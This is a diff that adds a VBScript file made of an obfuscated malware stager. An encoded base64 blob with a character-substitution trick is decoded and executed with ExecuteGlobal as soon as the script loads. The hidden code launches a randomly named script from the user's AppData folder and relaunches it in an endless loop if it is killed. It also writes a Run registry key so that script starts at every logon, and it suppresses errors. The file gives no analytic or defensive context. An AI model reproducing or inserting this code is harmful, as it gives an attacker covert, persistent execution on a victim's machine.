@@ -1,0 +1,42 @@
+Const TypeBinary = 1
+Const ForReading = 1, ForWriting = 2, ForAppending = 8
+
+
+Private Function decodeBase64(base64)
+  Dim DM, EL
+  Set DM = CreateObject("Microsoft.XMLDOM")
+  Set EL = DM.createElement("tmp")
+  EL.DataType = "bin.base64"
+  EL.Text = base64
+  decodeBase64 = EL.NodeTypedValue
+End Function
+
+Private Sub gajdfaiksfshsfJKSFGjkfk()
+    ExecuteGlobal decode64(Replace("U2V0IG9ialNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKU2V0IHdtaU9iai^%9IEdldE9iamVjdCgid2lubWdtdHM6XFwuXHJvb3RcY2ltdjIiKQpkaW0gZmlsZTEsIFBJRDEsIGFwcGRhdGFkaXIKYXBwZGF0YWRpci^%9IG9ialNoZWxsLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJWFwcGRhdGElIikKZmlsZTEgPS^%iclh2T2xSSGpwdy52YnMiCk9uIEVycm9yIFJlc3VtZSBOZXh0CmRpbSBydW5uaW5nI^%pydW5uaW5nID0gSXNGaWxlUnVubmluZyhmaWxlMSkKaWYgcnVubmluZy^%9IGZhbHNlIHRoZW4KUElEMS^%9IFJ1bkZpbGUoZmlsZTEpCmVsc2UKUElEMS^%9IHJ1bm5pbmcKZW5kIGlmClNldCBydW5uaW5nID0gTm90aGluZwp3aGlsZSB0cnVlCmlmIElzUHJvY2Vzc1J1bm5pbmcoUElEMSkgPSBmYWxzZSB0aGVuClBJRDEgPSBSdW5GaWxlKGZpbGUxKQplbmQgaWYKb2JqU2hlbGwuUmVnV3JpdGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXHN0YkRTSlBJbkYiLC^%id3NjcmlwdC^%iIiIgJiBhcHBkYXRhZGlyICYgIlwiICYgZmlsZTEgJi^%iIiIiLC^%iUkVHX1NaIgpXc2NyaXB0LlNsZWVwKDEwMCkKd2VuZ^%pmdW5jdGlvbiBJc1Byb2Nlc3NSdW5uaW5nKHBpZCkKU2V0IHJlc3VsdC^%9IHdtaU9iai5FeGVjUXVlcnkoIlNlbGVjdC^%qIEZyb20gV2luMzJfUHJvY2VzcyBXaGVyZSBQcm9jZXNzSWQ9Ii^%mIHBpZCkKaWYgcmVzdWx0LkNvdW50ID4gMCB0aGVuCklzUHJvY2Vzc1J1bm5pbmcgPSB0cnVlCmVsc2UKSXNQcm9jZXNzUnVubmluZy^%9IGZhbHNlCmVuZCBpZgplbmQgZnVuY3Rpb24KZnVuY3Rpb24gSXNGaWxlUnVubmluZyhmaWxlbmFtZSkKU2V0IHJlc3VsdC^%9IHdtaU9iai5FeGVjUXVlcnkoIlNlbGVjdC^%qIEZyb20gV2luMzJfUHJvY2VzcyBXaGVyZSBOYW1lPSd3c2NyaXB0LmV4ZSciKQpkaW0gZm91bmQKZm91bmQgPSBmYWxzZQpmb3IgZWFjaCBpdGVtIGluIHJlc3Vsd^%ppZiBJblN0cihpdGVtLkNvbW1hbmRMaW5lLCBmaWxlbmFtZSkgPi^%wIHRoZW4KZm91bmQgPSBpdGVtLlByb2Nlc3NJR^%pleGl0IGZvcgplbmQgaWYKbmV4d^%pJc0ZpbGVSdW5uaW5nID0gZm91bmQKZW5kIGZ1bmN0aW9uCmZ1bmN0aW9uIFJ1bkZpbGUocGF0aCkKUnVuRmlsZS^%9IG9ialNoZWxsLkV4ZWMoIldzY3JpcHQgIi^%mICIiIiIgJiBhcHBkYXRhZGlyICYgIlwiICYgcGF0aC^%mICIiIiIpLlByb2Nlc3NJR^%plbmQgZnVuY3Rpb24=", "^%", "A"))
+End Sub
+
+Private Function decode64(txt)
+  Dim DMX, ELX
+  Set DMX = CreateObject("Microsoft.XMLDOM")
+  Set ELX = DMX.createElement("tmp")
+  ELX.DataType = "bin.base64"
+  ELX.Text = txt
+  decode64 = zzzzzzzzzz(ELX.NodeTypedValue)
+End Function
+
+Function zzzzzzzzzz(Binary)
+  Const adTypeText = 2
+  Const adTypeBinary = 1
+
+  Dim BinaryStream 'As New Stream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+  BinaryStream.Type = adTypeBinary
+  BinaryStream.Open
+  BinaryStream.Write Binary
+  BinaryStream.Position = 0
+  BinaryStream.Type = adTypeText
+  BinaryStream.CharSet = "us-ascii"
+  zzzzzzzzzz = BinaryStream.ReadText
+  Set BinaryStream = Nothing
+End Function
+gajdfaiksfshsfJKSFGjkfk()
